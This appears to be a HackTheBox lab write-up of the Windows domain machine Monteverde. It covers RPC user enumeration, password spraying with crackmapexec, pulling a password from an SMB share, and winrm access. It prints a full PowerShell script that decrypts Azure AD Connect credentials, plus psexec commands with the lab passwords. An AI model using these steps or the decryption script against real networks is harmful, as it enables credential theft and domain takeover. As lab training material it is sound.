---
layout: single
title:  "HTB - Monteverde Writeup - 10.10.10.172"
date:   2020-06-18 16:49:23 +0100
categories: hackthebox
excerpt: My walkthrough / writeup of the HTB AD machine Monteverde.
---
![HTB](/images/monteverde/2020-06-19_14-43.png)

# HackTheBox - Monteverde - 10.10.10.100

Monteverde is a 30 point medium rated machine on hackthebox, that involves using rpcclient with null authentication to pillage domain usernames, then using hydra to use those usernames and usernames as passwords to find valid credentials. Once found we find the password for user `mhope` in a SMB share and we use his credentials to get a shell on the box. Once we are `mhope` we find he is a memeber of the Azure AD Admins groups so we can use a powershell script to decrypt the admin's credentials from the SQL database used by Azure AD Sync.

## 1. Recon 
To start this box off we will do an nmap scan of the target machine, 10.10.10.172  `nmap -sC -sV -oA nmap/monteverde 10.10.10.172` 
### Nmap Scan Results
```
Nmap scan report for 10.10.10.172
Host is up (0.061s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-24 18:36:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/24%Time=5E2B36F6%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m22s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-24T18:38:12
|_  start_date: N/A
```
Some ports of note here are:
1. RPC - Maybe we can get null authentication 
2. SMB - Maybe some useful files
3. LDAP - ldapquery?

### RPC Enumeration
Firstly we will try to get a connection to rpc with null authentication, using rpcclient: 
`rpcclient -U "" 10.10.10.172` `enumdomusers`
![rpc](/images/monteverde/2020-06-19_14-34.png)

Bingo, now we have a list of users!

## 2. Finding some credentials
Now we have a list of usernames we can try to bruteforce login credentials, using those usernames as passwords, first save the usernames to a file like this:
![usersfile](/images/monteverde/2020-06-19_14-37.png)

We can then use crackmapexec to bruteforce smb logins, if you want to read more about cme then the link to the github page is [here](https://github.com/byt3bl33d3r/CrackMapExec).

If we pass the arguments -u for users file and -p for password file, we can bruteforce logins:

`crackmapexec smb 10.10.10.172 -u usersfile.txt -p passfile.txt`
![cme](/images/monteverde/2020-06-19_14-49.png)
Nice, we got a valid login using the credentials, `SABatchJobs:SABatchJobs`, we can now try to enumerate the smb shares.

## 3. Getting More Credentials

### SMB Enumeration
To list all the smb shares we will use smbclient, which is built into Kali.

`smbclient -U "SABatchJobs" -L \\10.10.10.172`
![shares](/images/monteverde/2020-06-19_14-53.png)

The one share that stands out is the users$, as it is not a default Windows share like SYSVOL or IPC$

Let's try and connect using our credentials
`smbclient -U "SABatchJobs" \\\\10.10.10.172\\users$`
![smb-share](/images/monteverde/2020-06-19_15-01.png)

Nice, we can see the files in the users$ share, lets download all the files and see if there is anything interesting
`prompt OFF`, `recurse ON`, `mget *`
![files](/images/monteverde/2020-06-19_15-04.png)

The only file in the share was an `azure.xml` file, let;s see what's inside
`cat azure.xml`
![epic](/images/monteverde/2020-06-19_15-06.png)

Bingo! We have the password for the user `mhope`.

### Getting User
Now that we have the password for the user `mhope` we can try to login over winrm, for this I will be using a tool called [evil-winrm](https://github.com/Hackplayers/evil-winrm).

`evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$`

![htb](/images/monteverde/user.gif)

## 4. Privesc to Domain Admin

Now that we have a shell we can do some enumeration, firstly, `whoami /all`
![whoami](/images/monteverde/2020-06-19_15-24.png)

We can see we are a part of the azure admins, this means that with the right commands or script we can dump the admin password from the mssql database that Azure AD Connect uses, there is a great article by XPNSec that explains this [here](https://blog.xpnsec.com/azuread-connect-for-redteam/). So if we use the powershell script from the blog but with the connection string changed to work with this DB we should be good. Allternativly I will use a tool made by [fox-it on github](https://github.com/fox-it/adconnectdump), to decrypt the password as I could not get the powershell script to work for me. 

Here is the script the exe is based on:

{% highlight powershell %}
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
{% endhighlight %}

Now if we save the exe and dll from the fox-it github to our local machine, we can upload it using evil-winrm to the box

![upload](/images/monteverde/2020-06-19_15-46.png)

Now if we naviagate to: `C:\Program Files\Microsoft Azure AD Sync\Bin` and run `\Users\mhope\Documents\AdDecrypt.exe -FullSQL` we get the admin credentials

![creds](/images/monteverde/2020-06-19_15-51.png)

Now we can just use these creds to psexec into the box and grab the root flag

## Pwned

`psexec.py megabank/Administrator:"d0m@in4dminyeah!"@10.10.10.172`

![root](/images/monteverde/root.gif)

If you enjoyed my write up or found it useful please check out my htb profile linked below and give a +rep

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

